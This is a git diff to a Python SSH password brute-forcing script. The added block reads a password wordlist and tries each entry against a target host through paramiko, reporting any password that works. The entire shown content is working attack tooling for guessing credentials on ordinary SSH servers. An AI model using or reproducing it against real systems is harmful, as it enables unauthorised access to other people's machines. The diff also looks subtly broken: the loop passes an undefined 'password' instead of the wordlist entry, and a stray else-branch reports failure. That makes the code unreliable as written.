@@ -245,14 +245,57 @@ if args.service == "ssh":
                                   "----------------------------------------------------------")
                             exit(0)
                     open_ssh(target, port, user, pwd)
-                else:
-                    print("\n\033[1;31m------------------------------------------------------------------"
-                        "\n Sorry!! No password or username found on your wordlist"
-                        "\n Please provide wordlist with more words to increase your chance"
-                        "\n------------------------------------------------------------------")
-                    exit(0)
+            else:
+                print("\n\033[1;31m------------------------------------------------------------------"
+                    "\n Sorry!! No password or username found on your wordlist"
+                    "\n Please provide wordlist with more words to increase your chance"
+                    "\n------------------------------------------------------------------")
+                exit(0)
 
+        # When password file provided
+        else:
+            file = open(password_file)
+            pwd_list = file.readlines()
+
+            for pwd in pwd_list:
+                pwd = pwd.rstrip()
+
+                def open_ssh(target, port, username, pwd):
+                    ssh = paramiko.SSHClient()
+                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    try:
+                        ssh.connect(target, port, username, pwd, timeout=600)
+                    except socket.timeout:
+                        print(f"[!] Host: {target} is unreachable")
+                        return False
+                    except paramiko.AuthenticationException:
+                        if args.verbose in sys.argv:
+                            if args.verbose != "show":
+                                return False
+                            print('\033[1;37m''[+]', username, '_', pwd)
+                        return False
+                    except paramiko.ssh_exception.NoValidConnectionsError:
+                        print(
+                            f"\n\033[1;33m[*] Connection timeout, The script will restart connection in 10 seconds... Press CTRL+c to cancel")
+                        time.sleep(10)
+                        return open_ssh(target, port, username, pwd)
+                    except paramiko.ssh_exception.SSHException:
+                        print(
+                            "\n\033[1;31mConnection was aborted by the software in your host machine... And we don't know why")
+                        exit(0)
+                    else:
+                        print("\n\033[1;92m-----------------------------------------"
+                              "\n Password found:", pwd,
+                              "\n------------------------------------------")
+                        exit(0)
+                open_ssh(target, port, user, password)
 
     except KeyboardInterrupt:
         print("\n\033[1;31m[*] CTRL+c detected... Exiting now")
+        exit(0)
+    else:
+        print("\n\033[1;31m------------------------------------------------------------------"
+            "\n Sorry!! No password or username found on your wordlist"
+            "\n Please provide wordlist with more words to increase your chance"
+            "\n------------------------------------------------------------------")
         exit(0)
